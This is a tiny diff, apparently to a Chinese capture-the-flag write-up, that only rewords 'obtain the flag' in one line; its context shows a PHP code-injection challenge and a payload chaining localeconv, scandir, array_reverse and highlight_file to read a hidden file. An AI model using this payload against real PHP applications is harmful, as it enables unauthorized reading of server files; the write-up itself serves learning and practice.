@@ -123,4 +123,4 @@ if(isset($_GET['c'])){
 aGho.php?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));
 ```
 
-获得flag。
+得到flag。
